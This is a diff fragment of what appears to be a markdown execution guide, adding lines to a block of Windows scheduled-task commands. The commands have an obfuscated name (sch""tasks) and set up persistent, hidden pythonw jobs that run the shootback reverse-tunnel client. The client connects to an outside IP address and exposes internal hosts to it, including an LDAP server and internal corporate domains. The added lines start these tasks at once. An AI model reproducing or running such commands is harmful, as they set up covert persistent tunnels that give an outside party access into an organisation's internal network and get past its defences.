@@ -4,6 +4,11 @@ sch""tasks /create /tn "pac1" /tr "C:\temp\python\pythonw.exe C:\temp\python\sho
 sch""tasks /create /tn "pac2" /tr "C:\temp\python\pythonw.exe C:\temp\python\shootback\slaver_singlefile.py -m 54.236.23.49:1336 -t 10.1.0.70:389" /sc hourly /mo 4
 sch""tasks /create /tn "pac4" /tr "C:\temp\python\pythonw.exe C:\temp\python\shootback\slaver_singlefile.py -m 54.236.23.49:1337 -t infraascode.localiza.com:443" /sc hourly /mo 4
 sch""tasks /create /tn "pac5" /tr "C:\temp\python\pythonw.exe C:\temp\python\shootback\slaver_singlefile.py -m 54.236.23.49:1338 -t netadmin.localiza.com:443" /sc hourly /mo 4
+
+sch""tasks /run /tn "pac1"
+sch""tasks /run /tn "pac2"
+sch""tasks /run /tn "pac4"
+sch""tasks /run /tn "pac5"
 ```
 
 # Guia de Execução
